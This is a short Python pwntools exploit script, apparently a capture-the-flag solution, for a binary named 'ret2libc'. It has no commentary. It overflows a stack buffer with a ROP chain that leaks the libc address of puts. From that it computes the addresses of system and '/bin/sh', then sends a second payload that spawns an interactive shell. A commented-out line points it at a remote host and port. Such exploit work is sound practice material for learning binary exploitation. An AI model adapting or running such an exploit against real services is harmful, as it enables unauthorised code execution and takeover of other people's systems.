from pwn import *
context.log_level = 'debug'
elf=ELF('ret2libc')
p=process('./ret2libc')
libc=ELF('./libc.so.6')
#p = remote("58.240.236.232",13002)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
print("puts_plt"+str(hex(puts_plt)))
print("puts_got"+str(hex(puts_got)))
main_addr = 0x400715
pop_rdi_ret = 0x04007a3
payload1='a'*56+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.recvuntil("[!]System starting")
p.sendline(payload1)
#puts_addr=u64(p.recv(8))
#print("puts addr = ", hex(puts_addr))
p.recvuntil("[-]OK,Bye!\n")
test=p.recvline()
puts_addr=u64(test[:-1].ljust(8,'\x00'))
print(hex(puts_addr))
#sys_off=0x453a0
sys_off=libc.sym['system']
puts_off=libc.sym['puts']
str_off=next(libc.search('/bin/sh'))
#str_off=0x18ce17
sys_addr=puts_addr-puts_off+sys_off
bin_addr=puts_addr-puts_off+str_off
payload2='a'*56+p64(pop_rdi_ret)+p64(bin_addr)+p64(sys_addr)+p64(main_addr)
p.recvuntil("[!]System starting")
p.sendline(payload2)
p.interactive()

